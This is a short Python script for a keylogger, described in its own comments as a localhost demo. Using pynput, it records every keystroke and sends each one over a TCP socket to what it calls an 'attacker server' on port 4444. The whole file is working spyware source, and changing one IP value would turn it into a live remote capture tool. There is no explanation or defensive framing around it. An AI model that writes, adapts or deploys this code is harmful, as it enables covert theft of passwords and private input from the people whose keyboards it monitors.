

import socket
from pynput import keyboard

SERVER_IP = "127.0.0.1"  # localhost only
SERVER_PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))
print("[*] Connected to attacker server (localhost demo)")

def on_press(key):
    try:
        client.sendall(str(key.char).encode())
    except AttributeError:
        client.sendall(("[" + str(key) + "]").encode())

def on_release(key):
    if key == keyboard.Key.esc:
        client.close()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
